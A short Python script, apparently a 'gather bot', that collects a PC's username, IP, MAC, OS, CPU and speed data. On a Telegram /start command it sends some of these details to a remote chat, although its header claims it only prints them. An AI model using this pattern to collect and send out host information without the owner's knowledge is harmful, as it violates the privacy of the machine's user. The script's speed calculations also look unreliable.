# Gather Bot (no info flle).
# This script prints out info about PC.
#
# Nyukers (C)opyright, 2021.
#
# speedtest -> speedtest-cli
# telebot   -> PyTelegramBotAPI

import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
#import pyautogui
import speedtest
import telebot
import psutil
import platform
#from PIL import Image

bot = telebot.TeleBot("put_token_here")

start = datetime.now()

# Username, IP, MAC, OS
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()

# Download, Upload, Ping
inet = speedtest.Speedtest()
inet.get_best_server()
download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.upload(), 2))[1]) * 0.125
#res = inet.results.dict()
#pingme = res["ping"]
#print(res["download"], res["upload"], res["ping"])

# Timezone	
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)

# CPU Frequency
cpu = psutil.cpu_freq()

ends = datetime.now()
workspeed = format(ends - start)

#file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
text2 = "Operating System: "+ ost.system + "\nProcessor: "+ ost.processor+ "\nUsername: "+ name + "\nIP adress: " + ip  

# Bot
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, text2)
    bot.stop_polling()
bot.polling()
